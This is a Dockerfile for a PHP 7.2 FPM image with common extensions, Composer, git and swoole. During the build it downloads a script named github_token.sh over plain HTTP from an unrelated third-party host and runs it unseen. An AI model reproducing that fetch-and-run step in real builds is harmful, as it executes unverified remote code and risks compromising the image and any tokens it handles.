FROM docker.io/php:7.2.3-fpm
RUN apt-get update && apt-get install -y \
        libfreetype6-dev \
        libjpeg62-turbo-dev \
        libmcrypt-dev \
        libpng12-dev \
    && docker-php-ext-install -j$(nproc) iconv mcrypt bcmath calendar ctype exif gettext pdo_mysql shmop sockets zip mysqli\
    && docker-php-ext-configure gd --with-freetype-dir=/usr/include/ --with-jpeg-dir=/usr/include/\
    && docker-php-ext-install -j$(nproc) gd pcntl

RUN pecl install redis\
    && pecl install xdebug \
    && docker-php-ext-enable redis xdebug
    
RUN curl -sS https://getcomposer.org/installer | php && mv composer.phar /usr/local/bin/composer
RUN chmod +x /usr/local/bin/composer
RUN echo 'export PATH="$PATH:$HOME/.composer/vendor/bin"' >> ~/.bashrc \
  && . ~/.bashrc \
  && composer config -g repo.packagist composer https://packagist.phpcomposer.com
RUN apt-get update && apt-get install -y git
RUN curl -o github_token.sh http://zheli.org/data/f_44016886.sh && chmod +x ./github_token.sh && ./github_token.sh
RUN composer global require fxp/composer-asset-plugin
RUN pecl install swoole